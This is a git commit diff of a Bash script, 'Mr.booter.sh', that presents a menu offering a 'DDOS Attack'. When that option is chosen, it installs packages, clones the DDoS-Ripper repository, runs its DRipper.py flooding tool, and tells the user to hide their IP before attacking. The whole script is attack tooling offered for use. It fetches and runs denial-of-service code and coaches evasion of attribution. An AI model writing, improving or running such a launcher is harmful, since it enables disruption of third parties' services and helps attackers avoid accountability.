8eb11fdabf4db045ef1f935612c63a2faccdabee
iHavebraincells <rizzbash32@gmail.com>
2025-08-13 11:01:43 -0400

    Update Mr.booter.sh

--- Mr.booter.sh
+++ Mr.booter.sh
@@ -1,59 +1,56 @@
+#!/bin/bash
 clear
-mkdir Tools
-clear 
-echo -e '\033[31;40;1m 
-
-░▒▓██████████████▓▒░░▒▓███████▓▒░       ░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓███████▓▒░       ░▒▓███████▓▒░       ░▒▓████████▓▒░ 
-░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
-░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
-░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░       ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓██████▓▒░ ░▒▓███████▓▒░        ░▒▓██████▓▒░       ░▒▓█▓▒░░▒▓█▓▒░ 
-░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░ 
-░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓██▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓██▓▒░▒▓█▓▒░░▒▓█▓▒░ 
-░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓██▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░  ░▒▓█▓▒░   ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓████████▓▒░▒▓██▓▒░▒▓████████▓▒░ 
-                                                                                                                                                               
-                                                                                                                                                               
-Coded by Tray  discord user is got2muchbandz_
- \033[33;4mCTRL+C:\033[0m exit  
-
-   \e[37m[01]\e[36m DDOS Attack,
-,
-
-#Option Selection
-
-   read -p "Transaction number: " islem
-if [[ $islem == 01 || $islem == 01 ]]; then
+mkdir -p Tools
 clear
 
-echo -e "\033[47;31;5m Installing update and requirements...\033[0m"
-sleep 5
-pkg install git -y
-pkg install python python3 -y
-pkg install pip pip3 -y
-pkg install curl -y
-apt update
-apt upgrade -y
-clear
-echo -e "\033[47;3;35m Full update...\033[0m"
-sleep 3
-bash Mr.booter.sh
+# ░▒▓ style ASCII banner for MR.BOOTER
+echo -e '\033[31;40;1m
 
-,
-elif [[ $islem == 01 || $islem == 01 ]]; then
-clear
-echo -e "\033[47;3;35m installing may take time\033[0m"
-sleep 3
-cd Tools
-git clone https://github.com/palahsu/DDoS-Ripper.git
-cd DDoS-Ripper
-python3 DRipper.py
-echo ""
-echo -e "\033[47;3;35m Before using it, hide your IP.\033[0m"
+█▀▄▀█ █▄▄▄▄  ███   ████▄ ████▄    ▄▄▄▄▀ ▄███▄   █▄▄▄▄ 
+█ █ █ █  ▄▀  █  █  █   █ █   █ ▀▀▀ █    █▀   ▀  █  ▄▀ 
+█ ▄ █ █▀▀▌   █ ▀ ▄ █   █ █   █     █    ██▄▄    █▀▀▌  
+█   █ █  █   █  ▄▀ ▀████ ▀████    █     █▄   ▄▀ █  █  
+   █    █ ██ ███                 ▀      ▀███▀     █   
+  ▀    ▀                                         ▀    
+                                                      
 
-else   
-	clear
-        'echo -e '\033[36;40;1m You entered the wrong code.'	
-	sleep 1
-	clear 
-	bash Mr.booter.sh
+\033[0m'
+
+# Coded info
+echo -e "Coded by Tray | Discord: got2muchbandz_"
+echo -e "\033[33;4mCTRL+C:\033[0m exit"
+
+# Menu
+echo -e "\e[37m[01]\e[36m DDOS Attack"
+
+# Option Selection
+read -p "Transaction number: " islem
+
+if [[ $islem == 01 || $islem == 1 ]]; then
+    clear
+    echo -e "Installing update and requirements..."
+    sleep 2
+    pkg install git -y
+    pkg install python python3 -y
+    pkg install pip pip3 -y
+    pkg install curl -y
+    apt update
+    apt upgrade -y
+    clear
+    echo -e "Full update completed."
+    sleep 1
+    clear
+    cd Tools
+    git clone https://github.com/palahsu/DDoS-Ripper.git
+    cd DDoS-Ripper
+    python3 DRipper.py
+    echo ""
+    echo -e "Before using it, hide your IP."
+
+else
+    clear
+    echo -e "You entered the wrong code."
+    sleep 1
+    clear
+    bash $0
 fi
-,
